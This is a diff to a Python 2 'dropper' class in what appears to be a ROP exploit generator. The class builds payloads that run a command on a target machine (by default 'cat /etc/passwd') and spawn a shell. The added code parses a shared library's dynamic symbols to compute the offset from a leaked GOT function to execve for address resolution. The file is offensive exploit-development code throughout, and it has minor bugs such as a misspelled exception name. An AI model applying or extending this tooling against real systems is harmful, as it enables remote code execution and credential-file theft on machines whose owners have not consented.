@@ -1,8 +1,10 @@
 from gadgets.gadgetstools import GadgetTools
 from chunks.payloadchunk import PayloadChunk
+from elftools.elf import elffile
 
 import struct
 import pickle
+import math
 
 import pdb
 
@@ -25,6 +27,7 @@ class dropper():
             self.readable_area = self.get_readable_area()
 
         self.set_cmd("/bin/cat", ["/bin/cat", "/etc/passwd"])
+        self.so_symbols = {}
 
     def set_can_control_fd(self, value):
         """Set the filedescriptor controlled by the user, if no fd can be controlled should be set at -1.
@@ -39,14 +42,14 @@ class dropper():
         return 0x808080
 
     def set_cmd(self, cmd, argv):
-        """Set the cmd and the argument vector to execute on the target machine if our payload made the exploit successful
+        """Set the cmd and the argument vector to execute on the target machine.
         Args:
         cmd = the full path of the executable on the target machine to invoke
         argv = the command line arguments to pass to the executable (with the name of the executable itself)
 
         """
-        self.cmd = cmd + '\00'
-        self.argv = [a + '\00' for a in argv]
+        self.cmd = cmd + '\x00'
+        self.argv = [a + '\x00' for a in argv]
 
     def analyze_all(self):
         print "Finding gadgets.."
@@ -95,20 +98,41 @@ class dropper():
 
         return imports, imports_plt
 
-    def set_function_for_address_resolving(self, name='', offset=0, base=0, size=0):
-        """Set the function from which calculate the offset of execve or system, this function should be already be used before the patching.
+    def add_shared_object(self, path):
+        """Add the base addresses of functions in the file pointed by path.
         """
+        try:
+            f = open(path, 'rb')
+        except Exception as e:
+            print e
+            return
+
+        elf = elffile.ELFFile(f)        
+        _dynsym = elf.get_section_by_name('.dynsym')
+
+        if not _dynsym:
+            raise BaseExecption("Shared file provided has no .dynsym section")
+
+        self.so_symbols.update({s.name : s for s in _dynsym.iter_symbols()})
+
+        f.close()
+        
+    def set_function_for_address_resolving(self, name, target='execve', offset=0, base=0, size=0):
+        """Set which function to use as base for got dereferencing (default target function is execve) 
+        """
+        if name not in self.so_symbols:
+            print 'WARNING: Trying to use got dereferencing for a function not preent in the so provided'
+
         self._got_f = name
-        self._got_offset = offset
-        self._got_base = base
-        self._got_size = size
 
-        #stubxo
-        self._got_f = 'strrchr'
-        self._got_offset = 0x34180
-        self._got_base = 0x837a0
-        self._got_size = 3
+        if offset == 0:
+            self._got_offset = self.so_symbols[target].entry.st_value - self.so_symbols[name].entry.st_value
 
+        if base == 0:
+            self._got_base = self.so_symbols[name].entry.st_value
+
+        if size == 0:
+            self._got_size = int(math.ceil(math.log(self._got_offset, 2) / 8))
 
     def build_spawn_shell_payload(self):
         if not self.analyzed:
